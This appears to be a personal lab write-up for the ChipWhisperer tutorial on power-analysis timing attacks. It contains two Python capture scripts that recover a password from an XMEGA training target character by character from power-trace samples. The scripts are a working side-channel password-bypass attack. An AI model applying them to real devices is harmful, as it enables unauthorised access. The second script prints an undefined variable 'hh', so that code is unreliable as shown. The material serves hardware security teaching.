
# Tutorial B3-1 Timing Analysis with Power for Password Bypass

Test script for chipwhisperer tutorial : https://wiki.newae.com/Tutorial_B3-1_Timing_Analysis_with_Power_for_Password_Bypass

## One character check. 

I found a trace that worked for me around 203 units. Unfortunately this is not good enough for full password discovery.

```
"""Setup script for CWLite/1200 with XMEGA (CW303/CW308-XMEGA/CWLite target)

Configures scope settings to prepare for capturing SimpleSerial power traces
"""

# GUI compatibility
try:
    scope = self.scope
    aux_list = self.aux_list

except NameError:
    pass
    
scope.gain.gain = 45
scope.adc.samples = 25000
scope.adc.offset = 0
scope.adc.basic_mode = "rising_edge"
scope.clock.clkgen_freq = 7370000
scope.clock.adc_src = "clkgen_x4"
scope.trigger.triggers = "tio4"
scope.io.tio1 = "serial_rx"
scope.io.tio2 = "serial_tx"
scope.io.hs2 = "clkgen"

target.key_cmd = ''
target.go_cmd = ''
target.output_cmd = ''


from chipwhisperer.capture.auxiliary.ResetCW1173Read import ResetCW1173
Resetter = ResetCW1173(xmega=True, delay_ms=1200)
aux_list.register(Resetter.resetThenDelay, "before_trace")

# h0px3\n
trylist = 'abcdefghijklmnopqrstuvwxyz0123456789'
password = ''

for c in trylist:
    # Get a power trace using our next attempt
    nextPass = password + '{}'.format(c) + "\n"
    target.go_cmd = nextPass
    cw.captureN(self.scope, self.target, None, self.aux_list, self.ktp, 1)
        
    # Grab the trace and check nextTrace[203]
    nextTrace = scope.getLastTrace()
    
    # check where the power spike happens and change the values below. Mine was at 203 and I checked for values smaller than -0.135
    if nextTrace[203] < -0.135: 
        print "Success: " + c

```


## All characters

I had issues with the start point of 203 points that I identified in the first step. Keep in mind that when an attempt is made the trace is slightly different compared to when it completes and finds the password correctly. The processing trace is different. 

In the end, I observed a successful trace and worked backwards from there as well. Hence why my startPoint now is set to 344 points with a step of 36.  

![Graph](https://github.com/kxynos/Notes/raw/master/chipwhisperer/passwd-check-graph.png)

_Figure.1 Example traces that I found worked for my setup_


```
"""Setup script for CWLite/1200 with XMEGA (CW303/CW308-XMEGA/CWLite target)

Configures scope settings to prepare for capturing SimpleSerial power traces
"""

# GUI compatibility
try:
    scope = self.scope
    aux_list = self.aux_list

except NameError:
    pass
    
scope.gain.gain = 45
scope.adc.samples = 25000
scope.adc.offset = 18
scope.adc.basic_mode = "rising_edge"
scope.clock.clkgen_freq = 7370000
scope.clock.adc_src = "clkgen_x4"
scope.trigger.triggers = "tio4"
scope.io.tio1 = "serial_rx"
scope.io.tio2 = "serial_tx"
scope.io.hs2 = "clkgen"

target.key_cmd = ''
target.go_cmd = ''
target.output_cmd = ''


from chipwhisperer.capture.auxiliary.ResetCW1173Read import ResetCW1173
Resetter = ResetCW1173(xmega=True, delay_ms=1200)
aux_list.register(Resetter.resetThenDelay, "before_trace")

# password if h0px3\n
# trylist = 'abghj0px3df' # short test list
trylist = 'abcdefghijklmnopqrstuvwxyz0123456789'
password = ''

for i in range(5):
    for c in trylist:
        # Get a power trace using our next attempt
        nextPass = password + '{}'.format(c) + "\n"
        target.go_cmd = nextPass
        cw.captureN(self.scope, self.target, None, self.aux_list, self.ktp, 1)
        
        # Grab the trace
        nextTrace = scope.getLastTrace()
         
        startPoint = 344+36*i
        print hh, c
        print nextTrace[startPoint]

        # Check location 153, 225, etc. If it's too low, we've failed
        if nextTrace[startPoint] < -0.104:
            print 'found'

            
            # If we got here, we've found the right letter
            password += c
            print '{} characters: {}'.format(i+1, password)
            break
```
